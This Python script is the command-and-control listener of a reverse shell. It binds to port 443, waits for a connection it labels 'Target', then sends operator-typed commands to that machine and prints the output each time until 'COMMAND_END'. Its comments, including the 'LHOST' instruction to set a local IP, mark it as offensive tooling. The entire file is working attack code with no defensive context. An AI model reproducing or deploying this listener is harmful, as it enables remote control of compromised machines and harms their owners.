import socket

# Configuration
LISTEN_HOST = '0.0.0.0'  # LHOST >> Change this For Your Local IP 
LISTEN_PORT = 443  # Change the Listening Port

def create_listener(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)
    print(f"Listening on {host}:{port}...")
    client_socket, client_address = server.accept()
    print(f"Target {client_address} is Connected.")
    return client_socket

def receive_and_send_commands(conn):
    try:
        while True:
            command = input("Enter command : ")
            if command.lower() == 'exit':
                conn.send(command.encode('utf-8'))
                break
            conn.send(command.encode('utf-8'))
            response = b""
            while True:
                data = conn.recv(4096)
                if b"COMMAND_END" in data:
                    response += data.replace(b"COMMAND_END", b"")
                    break
                response += data
            print("Received response:\n", response.decode('utf-8'))
    finally:
        conn.close()

def main():
    conn = create_listener(LISTEN_HOST, LISTEN_PORT)
    receive_and_send_commands(conn)

if __name__ == '__main__':
    main()
